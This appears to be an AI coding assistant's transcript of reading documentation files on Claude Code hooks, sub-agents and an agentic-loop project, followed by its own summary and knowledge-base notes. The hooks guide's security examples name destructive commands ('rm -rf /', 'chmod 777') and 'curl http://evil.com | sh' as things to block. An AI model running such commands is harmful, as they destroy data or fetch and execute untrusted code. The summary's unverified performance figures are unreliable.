fires after completion #### Notification Hook - **CANNOT BLOCK** - **Primary Control Point**: Handles Claude Code notifications - **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability - **Use Cases**: Custom notifications, logging, user alerts - **Limitation**: Cannot control Claude Code behavior, purely informational #### Stop Hook - **CAN BLOCK STOPPING** - **Primary Control Point**: Intercepts when Claude Code tries to finish responding - **Exit Code 2 Behavior**: Blocks stoppage, shows error to Claude (forces continuation) - **Use Cases**: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION - **Caution**: Can cause infinite loops if not properly controlled #### SubagentStop Hook - **CAN BLOCK SUBAGENT STOPPING** - **Primary Control Point**: Intercepts when Claude Code subagents try to finish - **Exit Code 2 Behavior**: Blocks subagent stoppage, shows error to subagent - **Use Cases**: Ensuring subagent tasks complete properly - **Example**: Our `subagent_stop.py` logs events and announces completion #### PreCompact Hook - **CANNOT BLOCK** - **Primary Control Point**: Fires before compaction operations - **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability - **Use Cases**: Transcript backup, context preservation, pre-compaction logging - **Example**: Our `pre_compact.py` creates transcript backups before compaction #### SessionStart Hook - **CANNOT BLOCK** - **Primary Control Point**: Fires when new sessions start or resume - **Exit Code 2 Behavior**: N/A - shows stderr to user only, no blocking capability - **Use Cases**: Loading development context, session initialization, environment setup - **Example**: Our `session_start.py` loads git status, recent issues, and context files ### Advanced JSON Output Control Beyond simple exit codes, hooks can return structured JSON for sophisticated control: #### Common JSON Fields (All Hook Types) ```json { "continue": true, // Whether Claude should continue (default: true) "stopReason": "string", // Message when continue=false (shown to user) "suppressOutput": true // Hide stdout from transcript (default: false) } ``` #### PreToolUse Decision Control ```json { "decision": "approve" | "block" | undefined, "reason": "Explanation for decision" } ``` - **"approve"**: Bypasses permission system, `reason` shown to user - **"block"**: Prevents tool execution, `reason` shown to Claude - **undefined**: Normal permission flow, `reason` ignored #### PostToolUse Decision Control ```json { "decision": "block" | undefined, "reason": "Explanation for decision" } ``` - **"block"**: Automatically prompts Claude with `reason` - **undefined**: No action, `reason` ignored #### Stop Decision Control ```json { "decision": "block" | undefined, "reason": "Must be provided when blocking Claude from stopping" } ``` - **"block"**: Prevents Claude from stopping, `reason` tells Claude how to proceed - **undefined**: Allows normal stopping, `reason` ignored ### Flow Control Priority When multiple control mechanisms are used, they follow this priority: 1. **`"continue": false`** - Takes precedence over all other controls 2. **`"decision": "block"`** - Hook-specific blocking behavior 3. **Exit Code 2** - Simple blocking via stderr 4. **Other Exit Codes** - Non-blocking errors ### Security Implementation Examples #### 1. Command Validation (PreToolUse) ```python # Block dangerous patterns dangerous_patterns = [ r'rm\s+.*-[rf]', # rm -rf variants r'sudo\s+rm', # sudo rm commands r'chmod\s+777', # Dangerous permissions r'>\s*/etc/', # Writing to system directories ] for pattern in dangerous_patterns: if re.search(pattern, command, re.IGNORECASE): print(f"BLOCKED: {pattern} detected", file=sys.stderr) sys.exit(2) ``` #### 2. Result Validation (PostToolUse) ```python # Validate file operations if tool_name == "Write" and not tool_response.get("success"): output = { "decision": "block", "reason": "File write operation failed, please check permissions and retry" } print(json.dumps(output)) sys.exit(0) ``` #### 3. Completion Validation (Stop Hook) ```python # Ensure critical tasks are complete if not all_tests_passed(): output = { "decision": "block", "reason": "Tests are failing. Please fix failing tests before completing." } print(json.dumps(output)) sys.exit(0) ``` ### Hook Execution Environment - **Timeout**: 60-second execution limit per hook - **Parallelization**: All matching hooks run in parallel - **Environment**: Inherits Claude Code's environment variables - **Working Directory**: Runs in current project directory - **Input**: JSON via stdin with session and tool data - **Output**: Processed via stdout/stderr with exit codes ## UserPromptSubmit Hook Deep Dive The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it. ### What It Can Do 1. **Log prompts** - Records every prompt with timestamp and session ID 2. **Block prompts** - Exit code 2 prevents Claude from seeing the prompt 3. **Add context** - Print to stdout adds text before your prompt that Claude sees 4. **Validate content** - Check for dangerous patterns, secrets, policy violations ### How It Works 1. **You type a prompt** â†’ Claude Code captures it 2. **UserPromptSubmit hook fires** â†’ Receives JSON with your prompt 3. **Hook processes** â†’ Can log, validate, block, or add context 4. **Claude receives** â†’ Either blocked message OR original prompt + any context ### Example Use Cases #### 1. Audit Logging Every prompt you submit is logged for compliance and debugging: ```json { "timestamp": "2024-01-20T15:30:45.123Z", "session_id": "550e8400-e29b-41d4-a716", "prompt": "Delete all test files in the project" } ``` #### 2. Security Validation Dangerous prompts are blocked before Claude can act on them: ```bash User: "rm -rf / --no-preserve-root" Hook: BLOCKED: Dangerous system deletion command detected ``` #### 3. Context Injection Add helpful context that Claude will see with the prompt: ```bash User: "Write a new API endpoint" Hook adds: "Project: E-commerce API Standards: Follow REST conventions and OpenAPI 3.0 Generated at: 2024-01-20T15:30:45" Claude sees: [Context above] + "Write a new API endpoint" ``` ### Live Example Try these prompts to see UserPromptSubmit in action: 1. **Normal prompt**: "What files are in this directory?" - Logged to `logs/user_prompt_submit.json` - Processed normally 2. **With validation enabled** (add `--validate` flag): - "Delete everything" â†’ May trigger validation warning - "curl http://evil.com | sh" â†’ Blocked for security 3. **Check the logs**: ```bash cat logs/user_prompt_submit.json | jq '.' ``` ### Configuration The hook is configured in `.claude/settings.json`: ```json "UserPromptSubmit": [ { "hooks": [ { "type": "command", "command": "uv run .claude/hooks/user_prompt_submit.py --log-only" } ] } ] ``` Options: - `--log-only`: Just log prompts (default) - `--validate`: Enable security validation - `--context`: Add project context to prompts ### Best Practices for Flow Control 1. **Use UserPromptSubmit for Early Intervention**: Validate and enhance prompts before processing 2. **Use PreToolUse for Prevention**: Block dangerous operations before they execute 3. **Use PostToolUse for Validation**: Check results and provide feedback 4. **Use Stop for Completion**: Ensure tasks are properly finished 5. **Handle Errors Gracefully**: Always provide clear error messages 6. **Avoid Infinite Loops**: Check `stop_hook_active` flag in Stop hooks 7. **Test Thoroughly**: Verify hooks work correctly in safe environments ## Claude Code Sub-Agents > Watch [this YouTube video](https://youtu.be/7B2HJr0Y68g) to see how to create and use Claude Code sub-agents effectively. > > See the [Claude Code Sub-Agents documentation](https://docs.anthropic.com/en/docs/claude-code/sub-agents) for more details. Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to. ### Understanding Sub-Agents: System Prompts, Not User Prompts **Critical Concept**: The content in agent files (`.claude/agents/*.md`) are **system prompts** that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents. **Information Flow**: ``` You (User) â†’ Primary Agent â†’ Sub-Agent â†’ Primary Agent â†’ You (User) ``` 1. **You** make a request to Claude Code (primary agent) 2. **Primary Agent** analyzes your request and delegates to appropriate sub-agent 3. **Sub-Agent** executes task using its system prompt instructions 4. **Sub-Agent** reports results back to primary agent 5. **Primary Agent** synthesizes and presents results to you **Key Points**: - Sub-agents NEVER communicate directly with you - Sub-agents start fresh with no conversation history - Sub-agents respond to the primary agent's prompt, not yours - The `description` field tells the primary agent WHEN to use the sub-agent ### Agent Storage & Organization This repository demonstrates various agent configurations: **Project Agents** (`.claude/agents/`): ``` .claude/agents/ â”œâ”€â”€ crypto/ # Cryptocurrency analysis agents â”‚ â”œâ”€â”€ crypto-coin-analyzer-haiku.md â”‚ â”œâ”€â”€ crypto-coin-analyzer-opus.md â”‚ â”œâ”€â”€ crypto-coin-analyzer-sonnet.md â”‚ â”œâ”€â”€ crypto-investment-plays-*.md â”‚ â”œâ”€â”€ crypto-market-agent-*.md â”‚ â”œâ”€â”€ crypto-movers-haiku.md â”‚ â””â”€â”€ macro-crypto-correlation-scanner-*.md â”œâ”€â”€ hello-world-agent.md # Simple greeting agent â”œâ”€â”€ llm-ai-agents-and-eng-research.md # AI research specialist â”œâ”€â”€ meta-agent.md # Agent that creates agents â””â”€â”€ work-completion-summary.md # Audio summary generator ``` **Storage Hierarchy**: - **Project agents**: `.claude/agents/` (higher priority, project-specific) - **User agents**: `~/.claude/agents/` (lower priority, available across all projects) - **Format**: Markdown files with YAML frontmatter **Agent File Structure:** ```yaml --- name: agent-name description: When to use this agent (critical for automatic delegation) tools: Tool1, Tool2, Tool3 # Optional - inherits all tools if omitted color: Cyan # Visual identifier in terminal model: opus # Optional - haiku | sonnet | opus - defaults to sonnet --- # Purpose You are a [role definition]. ## Instructions 1. Step-by-step instructions 2. What the agent should do 3. How to report results ## Report/Response Format Specify how the agent should communicate results back to the primary agent. ``` Sub-agents enable: - **Task specialization** - Code reviewers, debuggers, test runners - **Context preservation** - Each agent operates independently - **Tool restrictions** - Grant only necessary permissions - **Automatic delegation** - Claude proactively uses the right agent ### Key Engineering Insights **Two Critical Mistakes to Avoid:** 1. **Misunderstanding the System Prompt** - What you write in agent files is the *system prompt*, not a user prompt. This changes how you structure instructions and what information is available to the agent. 2. **Ignoring Information Flow** - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you. **Best Practices:** - Use the `description` field to tell your primary agent *when* and *how* to prompt sub-agents - Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions - Remember sub-agents start fresh with no context - be explicit about what they need to know - Follow Problem â†’ Solution â†’ Technology approach when building agents ### Complex Workflows & Agent Chaining Claude Code can intelligently chain multiple sub-agents together for complex tasks: For example: - "First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities" - "Use the debugger agent to fix errors, then have the code-reviewer check the changes" - "Generate a new agent with meta-agent, then test it on a specific task" This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns. ### The Meta-Agent The meta-agent (`.claude/agents/meta-agent.md`) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity. **Why Meta-Agent Matters:** - **Rapid Agent Creation** - Build dozens of specialized agents in minutes instead of hours - **Consistent Structure** - Ensures all agents follow best practices and proper formatting - **Live Documentation** - Pulls latest Claude Code docs to stay current with features - **Intelligent Tool Selection** - Automatically determines minimal tool requirements **Using the Meta-Agent:** ```bash # Simply describe what you want "Build a new sub-agent that runs tests and fixes failures" # Claude Code will automatically delegate to meta-agent # which will create a properly formatted agent file ``` The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially. ## Master AI Coding > And prepare for Agentic Engineering Learn to code with AI with foundational [Principles of AI Coding](https://agenticengineer.com/principled-ai-coding?y=ccsubagents) Follow the [IndyDevDan youtube channel](https://www.youtube.com/@indydevdan) for more AI coding tips and tricks.

file.content: # Infinite Agentic Loop POC > **Watch the Tutorial**: [Infinite Agentic Loop with Claude Code](https://youtu.be/9ipM_vDwflI) An experimental project demonstrating Infinite Agentic Loop in a two prompt system using Claude Code. ## Overview This project uses a custom Claude Code slash command (`/project:infinite`) to orchestrate multiple AI agents in parallel, generating evolving iterations of content based on specifications. ## Usage Read `.claude/settings.json` to see the permissions and commands allowed. Start Claude Code: `claude` Type slash command `/project:infinite` to start the infinite agentic loop. The infinite command takes three arguments: ``` /project:infinite ``` ### 4 Command Variants #### 1. Single Generation ```bash /project:infinite specs/invent_new_ui_v3.md src 1 ``` Generate one new iteration using the UI specification. #### 2. Small Batch (5 iterations) ```bash /project:infinite specs/invent_new_ui_v3.md src_new 5 ``` Deploy 5 parallel agents to generate 5 unique iterations simultaneously. #### 3. Large Batch (20 iterations) ```bash /project:infinite specs/invent_new_ui_v3.md src_new 20 ``` Generate 20 iterations in coordinated batches of 5 agents for optimal resource management. #### 4. Infinite Mode ```bash /project:infinite specs/invent_new_ui_v3.md infinite_src_new/ infinite ``` Continuous generation in waves until context limits are reached, with progressive sophistication. ## How It Works 1. **Specification Analysis**: Reads and understands the spec file requirements 2. **Directory Reconnaissance**: Analyzes existing iterations to determine starting point 3. **Parallel Coordination**: Deploys Sub Agents with unique creative directions 4. **Quality Assurance**: Ensures each iteration is unique and spec-compliant 5. **Wave Management**: For infinite mode, manages successive waves of agents ## Directions you can take to enhance this pattern - Apply this to a use case of your choice. - Build an MCP Server that enables reuse of the infinite agentic loop. - Get the `.claude/commands/infinite.md` into your `~/.claude/commands/` directory for global use. - Update `.claude/commands/infinite.md` to generate sets of files instead of a single file. ## Master AI Coding Learn to code with AI with foundational [Principles of AI Coding](https://agenticengineer.com/principled-ai-coding?y=infageloop) Follow the [IndyDevDan youtube channel](https://www.youtube.com/@indydevdan) for more AI coding tips and tricks. Use the best Agentic Coding tool: [Claude Code](https://docs.anthropic.com/en/docs/claude-code/overview)

Now I have a comprehensive understanding of the examples/ directory. Let me provide a detailed summary of what I found.

# Comprehensive Examples Directory Analysis

## Overview
The examples/ directory contains **14 major working implementations** across different complexity levels, demonstrating the full spectrum of Claude Code capabilities from basic setup to advanced multi-agent systems.

## Directory Structure & Learning Progression

### **ðŸš€ Getting Started (5-15 minutes)**
Located in `examples/getting-started/` and basic sections of `examples/inspirations/`:

**1. 5-Minute Setup (`/getting-started/5-minute-setup/`)**
- **Purpose**: Immediate productivity with Claude Code
- **Key Features**: Repository recognition, knowledge base access, command validation
- **Learning Objective**: Basic Claude Code integration and validation
- **Setup Requirements**: Claude Code installation only

**2. Claude 3.7 Sonnet Starter Pack (`/inspirations/claude-3-7-sonnet-starter-pack/`)**
- **Purpose**: Core API patterns and extended thinking capabilities
- **Key Technologies**: Claude 3.7 Sonnet, extended thinking (1k-64k tokens), MCP integration
- **Contains**: 10 self-contained Python scripts demonstrating progressive complexity
- **Patterns**: Simple prompts â†’ structured output â†’ tool use â†’ extended thinking â†’ streaming â†’ MCP servers
- **Special Features**: Model comparison insights, thinking budget optimization guide

**3. Personal AI Starter Pack (`/inspirations/personal-ai-starter-pack/`)**
- **Purpose**: Basic multi-model AI assistant setup
- **Key Technologies**: Multiple LLM providers, structured outputs
- **Learning Focus**: Foundation for personal AI automation

### **ðŸ”§ Guided Tutorials (30-60 minutes)**
Intermediate complexity with clear learning outcomes:

**4. Claude Code Hooks Mastery (`/inspirations/claude-code-hooks-mastery/`)**
- **Purpose**: Complete lifecycle hook system demonstration
- **Key Features**: All 8 hook events (UserPromptSubmit, PreToolUse, PostToolUse, Notification, Stop, SubagentStop, PreCompact, SessionStart)
- **Technologies**: UV single-file scripts, intelligent TTS system, security enhancements
- **Advanced Patterns**: Exit code flow control, JSON output control, sub-agent coordination
- **Special Components**: Meta-agent system for building agents

**5. Claude Code is Programmable (`/inspirations/claude-code-is-programmable/`)**
- **Purpose**: Advanced programmable agent patterns
- **Key Demonstrations**: Voice integration, testing frameworks, embedded agents
- **Technologies**: Various integration patterns with external systems

**6. Just Prompt (`/inspirations/just-prompt/`)**
- **Purpose**: Multi-LLM integration and reasoning coordination
- **Key Features**: MCP server for unified LLM access (OpenAI, Anthropic, Gemini, Groq, DeepSeek, Ollama)
- **Special Tools**: CEO & Board decision-making system, reasoning effort control, thinking tokens
- **Architecture**: Atomic/molecular pattern with comprehensive provider abstractions

**7. Single File Agents (`/inspirations/single-file-agents/`)**
- **Purpose**: Comprehensive single-file agent patterns across multiple providers
- **Contains**: 15+ specialized agents (DuckDB, SQLite, JQ, Polars, Web Scraping, Meta Prompt Generation)
- **Technologies**: UV single-file scripts, multi-provider support (OpenAI, Anthropic, Gemini)
- **Architectural Patterns**: Atomic-composable, layered, pipeline, vertical-slice architectures
- **Special Features**: OpenAI Agents SDK examples (12 patterns)

### **ðŸ—ï¸ Advanced Projects (2+ hours)**
Production-ready, complex implementations:

**8. Claude Code Hooks Multi-Agent Observability (`/claude-code-hooks-multi-agent-observability/`)**
- **Purpose**: Full observability system with real-time dashboard
- **Architecture**: Claude Agents â†’ Hook Scripts â†’ HTTP POST â†’ Bun Server â†’ SQLite â†’ WebSocket â†’ Vue Client
- **Key Technologies**: Vue 3 + TypeScript frontend, Bun TypeScript server, SQLite with WAL mode
- **Features**: Real-time event streaming, multi-criteria filtering, live pulse charts, chat transcript viewer
- **Advanced Capabilities**: Session tracking, dual-color coding system, auto-scroll with manual override

**9. Always-On AI Assistant (`/inspirations/always-on-ai-assistant/`)**
- **Purpose**: Persistent AI assistant with voice interaction
- **Key Technologies**: DeepSeek V3, RealtimeSTT, ElevenLabs TTS, Typer commands
- **Architecture**: Brain (DeepSeek) + Ears (STT) + Mouth (TTS) + Active Memory (scratchpad)
- **Special Features**: Configuration-driven design, command generation, persistent state

**10. POC Realtime AI Assistant (`/inspirations/poc-realtime-ai-assistant/`)**
- **Purpose**: Real-time voice interaction system
- **Key Technologies**: OpenAI Realtime API, async Python implementation
- **Features**: Real-time audio processing, connection testing, personalization system

**11. Infinite Agentic Loop (`/inspirations/infinite-agentic-loop/`)**
- **Purpose**: Advanced UI generation system with parallel agent coordination
- **Key Pattern**: Custom slash command (`/project:infinite`) orchestrating multiple AI agents
- **Capabilities**: Single generation, batch processing (5-20 iterations), infinite mode
- **Architecture**: Specification analysis â†’ parallel coordination â†’ quality assurance â†’ wave management

### **ðŸ”Œ MCP Integration Examples**
Model Context Protocol implementations:

**12. Aider MCP Server (`/inspirations/aider-mcp-server/`)**
- **Purpose**: Integration with Aider AI coding assistant
- **Key Features**: MCP server implementation for external tool integration

**13. Pocket Pick (`/inspirations/pocket-pick/`)**
- **Purpose**: Personal engineering knowledge base with MCP integration
- **Key Features**: Tag-based organization, flexible search (substring, FTS, glob, regex), SQLite backend
- **Tools**: 8 MCP tools for knowledge management (add, find, list, remove, backup, etc.)
- **Search Capabilities**: Multiple search modes with powerful full-text search

### **ðŸŽ¯ Advanced Multi-Agent Systems**

**14. Multi-Agent Coordination System (`/advanced/multi-agent-coordination-system/`)**
- **Purpose**: Revolutionary agent orchestration for complex workflows
- **Agent Fleet**: 8 specialized agents (Research, Documentation, Performance, Security, Testing, Deployment, Analytics, Task Orchestrator)
- **Coordination Patterns**: Pipeline, Hub, and Mesh architectures
- **Advanced Features**: Intelligent task routing, context preservation, parallel processing, adaptive learning, conflict resolution
- **Performance Metrics**: 95%+ completion rate, 3.5x speedup, 67% error reduction

## Key Technologies Demonstrated

### **Programming Languages & Frameworks**
- **Python**: Dominant language across examples (UV single-file scripts, async programming)
- **JavaScript/TypeScript**: Vue.js frontends, Bun servers, Node.js integrations
- **Shell Scripts**: Automation and system integration

### **AI/ML Integration Patterns**
- **Multi-Provider Support**: OpenAI, Anthropic, Gemini, Groq, DeepSeek, Ollama
- **Advanced Features**: Extended thinking, reasoning effort, thinking tokens
- **MCP Protocol**: Multiple server implementations and integrations

### **Architectural Patterns**
- **Single-File Agents**: UV-based isolation with embedded dependencies
- **Multi-Agent Coordination**: Hub, pipeline, and mesh patterns
- **Event-Driven Systems**: Hook-based lifecycle management
- **Real-Time Systems**: WebSocket communication, live dashboards

### **Data & Storage**
- **SQLite**: Primary database across multiple examples
- **DuckDB**: High-performance analytics integration
- **JSON**: Configuration and data exchange format

## Learning Progression Strategy

### **Week 1: Foundations**
1. Start with 5-Minute Setup for basic validation
2. Work through Claude 3.7 Sonnet Starter Pack scripts progressively
3. Experiment with Personal AI Starter Pack for multi-model basics

### **Week 2: Intermediate Skills**
1. Master Claude Code Hooks system for lifecycle control
2. Build specialized agents using Single File Agents patterns
3. Implement multi-LLM coordination with Just Prompt

### **Week 3: Advanced Implementation**
1. Deploy observability system for production monitoring
2. Build voice-enabled assistant with real-time capabilities
3. Experiment with infinite agentic loops for complex generation

### **Week 4: Production Systems**
1. Implement multi-agent coordination for complex workflows
2. Build custom MCP servers for domain-specific integration
3. Create hybrid systems combining multiple patterns

## Unique Innovations & Patterns

### **UV Single-File Scripts Architecture**
- **Innovation**: Complete isolation of dependencies using UV's single-file script capability
- **Benefits**: No virtual environment management, portable scripts, fast execution
- **Usage**: Extensive throughout hook systems and agent implementations

### **Multi-Model Coordination Patterns**
- **CEO & Board System**: Just Prompt's decision-making architecture
- **Agent Orchestration**: Sophisticated coordination with conflict resolution
- **Context Preservation**: Shared memory across agent boundaries

# Knowledge Base Navigation

## Overview

This knowledge base synthesizes insights from 150+ research sources on AI in software engineering, Claude Code capabilities, and agentic system design. All content is organized for maximum discoverability and practical application.

## Topic Map & Organization

### ðŸ“š **Fundamentals** - Core Concepts and Theory

Essential understanding for Claude Code mastery:

- **[AI in Software Engineering](./fundamentals/ai-software-engineering.md)** - Core concepts, productivity multiplication, role transformation
- **[Agentic Systems](./fundamentals/agentic-systems.md)** - Multi-agent architectures, coordination patterns, autonomous systems  
- **[Claude Code Capabilities](./fundamentals/claude-code-capabilities.md)** - Complete feature overview, advanced usage patterns
- **[Transformation Impact](./fundamentals/transformation-impact.md)** - Industry evolution, future predictions, strategic implications

### ðŸ”§ **Implementation** - Practical Guidance and Patterns

Actionable strategies for immediate application:

- **[Memory Management](./implementation/memory-management.md)** - CLAUDE.md optimization, context strategies, token efficiency
- **[MCP Integration](./implementation/mcp-integration.md)** - External service connections, protocol architecture, security
- **[Hooks and Automation](./implementation/hooks-and-automation.md)** - Lifecycle automation, behavioral optimization, monitoring
- **[Performance Optimization](./implementation/performance-optimization.md)** - Cost management, efficiency strategies, scaling patterns

### ðŸ“– **Reference** - Quick Lookup and Troubleshooting

Instant access to essential information:

- **[Commands Reference](./reference/commands-reference.md)** - Complete command catalog with examples
- **[Prompt Patterns](./reference/prompt-patterns.md)** - Proven prompting strategies and templates

    28â†’# AI in Software Engineering: Fundamentals
    29â†’
    30â†’## Overview
    31â†’
    32â†’This comprehensive guide covers the foundational concepts of how AI, particularly Large Language Models (LLMs), is transforming software development. This knowledge is essential for understanding Claude Code's role in the broader AI-assisted development ecosystem.
    33â†’
    34â†’## I. Core Concepts of AI in Software Engineering
    35â†’
    36â†’### The Transformative Impact of AI
    37â†’
    38â†’#### Productivity Multiplier
    39â†’AI tools, particularly LLMs, dramatically increase engineer efficiency by automating:
    40â†’- Syntax memorization and boilerplate code generation
    41â†’- Basic debugging and error resolution
    42â†’- Code completion and suggestions
    43â†’- Documentation generation
    44â†’
    45â†’**Key Takeaway**: AI fundamentally redefines an engineer's role from manual implementation to strategic problem-solving.
    46â†’
    47â†’#### Shift from "How" to "What"
    48â†’Engineers are transitioning from:
    49â†’- **Manual Code Writing** â†’ **Problem Definition**
    50â†’- **Implementation Details** â†’ **High-Level System Design**
    51â†’- **Syntax Mastery** â†’ **Effective Prompting**
    52â†’
    53â†’**Key Takeaway**: Emphasis on problem-solving and strategic thinking over rote coding.
    54â†’
    55â†’#### Accessibility for Non-Experts
    56â†’AI code generation democratizes programming by enabling individuals without traditional coding skills to:
    57â†’- Generate reports with simple prompts
    58â†’- Create functional applications through natural language
    59â†’- Automate repetitive tasks without deep technical knowledge
    60â†’
    61â†’#### Automation of SDLC Phases
    62â†’AI influences all Software Development Life Cycle stages:
    63â†’- **Requirements Analysis**: Natural language to specification conversion
    64â†’- **Design**: Architecture generation and optimization
    65â†’- **Implementation**: Code generation and completion
    66â†’- **Testing**: Test case generation and debugging
    67â†’- **Deployment**: Infrastructure as Code generation
    68â†’- **Maintenance**: Refactoring and optimization
    69â†’
    70â†’### The Rise of AI Agents and Agentic Systems
    71â†’
    72â†’#### Definition and Architecture
    73â†’**Agents** are autonomous systems that accomplish complex, multi-step tasks using tools and predefined workflows.
    74â†’
    75â†’**Agent OS Framework** - Three Core Components:
    76â†’1. **LPU (Language Processing Unit)**: Models, prompts, and prompt chains
    77â†’2. **IO (Input/Output)**: Tools and external interfaces (browser, file system, database)
    78â†’3. **RAM (Memory)**: Context, state, and inputs for maintaining knowledge
    79â†’
    80â†’**Key Takeaway**: Agentic systems go beyond simple LLM calls by integrating tools and memory for complex operations.
    81â†’
    82â†’#### Beyond Single Prompts
    83â†’The industry evolution:
    84â†’- **Past**: Basic chat interfaces with single prompts
    85â†’- **Present**: Prompt chaining and orchestration
    86â†’- **Future**: Complex multi-agent coordination
    87â†’
    88â†’**Core Principle**: "One prompt is not enough" for sophisticated tasks.
    89â†’
    90â†’#### Multi-Agent Systems
    91â†’Complex problems are decomposed and delegated to multiple agents:
    92â†’- **Parallel Processing**: Multiple agents working simultaneously
    93â†’- **Specialized Expertise**: Each agent focused on specific domains
    94â†’- **Capabilities Beyond Human Scale**: Achievements impossible for individual humans
    95â†’
    96â†’#### Composability and Reusability
    97â†’Agents as **"Individual Functions"**:
    98â†’- Black boxes with defined inputs and outputs
    99â†’- Modular combination into larger systems
   100â†’- Reusable across different contexts and projects
   101â†’
   102â†’#### Self-Improvement (Emerging Concept)
   103â†’Current limitation: Most agents require human intervention for refinement
   104â†’Future development: Autonomous self-improvement capabilities
   105â†’
   106â†’## II. Key AI Coding Tools and Techniques
   107â†’
   108â†’### Claude Code Overview
   109â†’- **Platform**: Anthropic's CLI agent for AI-assisted coding
   110â†’- **Availability**: macOS, Linux, Windows
   111â†’- **Models**: Claude Opus 4, Sonnet 4, Haiku 3.5
   112â†’- **Key Feature**: "Primitive" tool offering granular control for custom solutions
   113â†’
   114â†’### Memory System (CLAUDE.md)
   115â†’File-based memory system with automatic loading:
   116â†’
   117â†’#### Memory Locations:
   118â†’1. **Project Memory** (`./CLAUDE.md`): Project-specific instructions shared via Git
   119â†’2. **User Memory** (`~/.claude/CLAUDE.md`): Personal preferences across all projects
   120â†’3. **Parent/Child Directory Memory**: Recursive loading from directory hierarchy
   121â†’
   122â†’#### Utility:
   123â†’- Persistent project instructions and coding styles
   124â†’- Bootstrapping via `/init` command
   125â†’- Team collaboration through shared guidelines
   126â†’
   127â†’### Prompting Best Practices
   128â†’
   129â†’#### Specificity
   130â†’- **Good**: "Refactor this function to improve readability"
   131â†’- **Poor**: "Make this better"
   132â†’
   133â†’#### Context and Motivation
   134â†’Explain the reasoning behind requests to help Claude understand goals.
   135â†’
   136â†’#### Few-shot Prompting
   137â†’Provide input/output examples to help recognize desired patterns.
   138â†’
   139â†’#### XML Tags
   140â†’Structure prompts with XML tags for enhanced clarity and parsing.
   141â†’
   142â†’#### Task Decomposition
   143â†’Focus on individual modules for improved accuracy and speed.
   144â†’
   145â†’#### Iterative Partnership
   146â†’- Treat Claude as a collaborative partner
   147â†’- One-shot success rate: ~33%
   148â†’- Iterate through feedback for better results
   149â†’
   150â†’#### Checkpoint-heavy Workflow
   151â†’Regular commits enable easy rollbacks and experimental development.
   152â†’
   153â†’### Commands and Features
   154â†’
   155â†’#### CLI Usage
   156â†’- `claude "task"`: One-time task execution
   157â†’- `claude -p "query"`: Non-interactive output
   158â†’- `claude -c`: Continue previous session
   159â†’- `claude -r`: Resume with session picker
   160â†’
   161â†’#### Slash Commands
   162â†’- **Built-in**: `/help`, `/clear`, `/compact`
   163â†’- **Custom**: Defined in `.claude/commands/` directory
   164â†’
   165â†’#### Hooks
   166â†’Customizable scripts for lifecycle events:
   167â†’- Notifications and auto-formatting
   168â†’- Logging and custom permissions
   169â†’- Performance monitoring
   170â†’
   171â†’#### Advanced Features
   172â†’- **Image Input**: UI mockups and screenshot analysis
   173â†’- **Parallel Sessions**: Git worktrees for simultaneous instances
   174â†’- **Semantic Linting**: Advanced code analysis beyond syntax
   175â†’- **Debugging Integration**: Logger addition and terminal output analysis
   176â†’
   177â†’### Sub Agents
   178â†’Self-contained, single-purpose agents with:
   179â†’- Defined tools and capabilities
   180â†’- Specific system prompts
   181â†’- Focused expertise domains
   182â†’
   183â†’#### Key Principle
   184â†’Users interact with primary agent, which delegates to sub-agents based on task requirements.
   185â†’
   186â†’#### Workflow
   187â†’1. User prompts primary agent
   188â†’2. Primary agent analyzes task complexity
   189â†’3. Delegates to appropriate sub-agent
   190â†’4. Sub-agent executes with clean context
   191â†’5. Results returned to primary agent
   192â†’
   193â†’#### Best Practices
   194â†’- Design focused, single-purpose agents
   195â†’- Write detailed system prompts
   196â†’- Limit tool access for security
   197â†’- Use version control for agent definitions
   198â†’
   199â†’### Model Context Protocol (MCP)
   200â†’Client-server architecture extending Claude Code capabilities:
   201â†’
   202â†’#### Scopes
   203â†’- **Local**: Single project integration
   204â†’- **Project**: Shared via `.mcp.json`
   205â†’- **User**: Global configuration
   206â†’
   207â†’#### Examples
   208â†’- **Postgres MCP**: Database query integration
   209â†’- **Aider MCP**: Task offloading to other AI tools
   210â†’- **Firecrawl MCP**: Web scraping capabilities
   211â†’- **Just-Prompt**: Multi-LLM provider access
   212â†’
   213â†’#### Security Features
   214â†’- Explicit user consent requirements
   215â†’- Command injection detection
   216â†’- Isolated context windows
   217â†’
   218â†’## III. Other Relevant Tools and Concepts
   219â†’
   220â†’### Complementary Tools
   221â†’- **Aider**: Terminal-based AI coding assistant with in-memory file tracking
   222â†’- **GPT Researcher**: Autonomous research agent with planner/execution architecture
   223â†’- **Repomix**: Repository packaging for LLM analysis
   224â†’- **RealtimeSTT**: Speech-to-text for voice interaction
   225â†’- **uv**: Modern Python package management
   226â†’
   227â†’### Advanced Techniques
   228â†’- **Fusion Chain (Beam)**: Multi-model parallel processing with response fusion
   229â†’- **Compute Advantage Equation**: Framework for AI tool evaluation (maximize compute scaling and autonomy, minimize time, effort, cost)
   230â†’
   231â†’## IV. Challenges and Limitations
   232â†’
   233â†’### Technical Challenges
   234â†’- **Code Quality**: May not adhere to best practices or introduce technical debt
   235â†’- **Security Vulnerabilities**: Iterative generation can increase critical vulnerabilities
   236â†’- **Hallucinations**: Non-deterministic behavior requiring human oversight
   237â†’- **Complex Abstraction**: Struggles with high-level system design
   238â†’- **Cost**: Expensive API calls and context window usage
   239â†’- **Cognitive Load**: Time spent "handholding" AI systems
   240â†’
   241â†’### Economic and Societal Concerns
   242â†’- **Job Market Impact**: Potential barrier increase for newcomers
   243â†’- **Skill Rot**: Over-reliance preventing skill development
   244â†’- **Ethical Issues**: IP concerns, bias inheritance, equitable access
   245â†’- **Trust**: Determining appropriate confidence levels in AI outputs
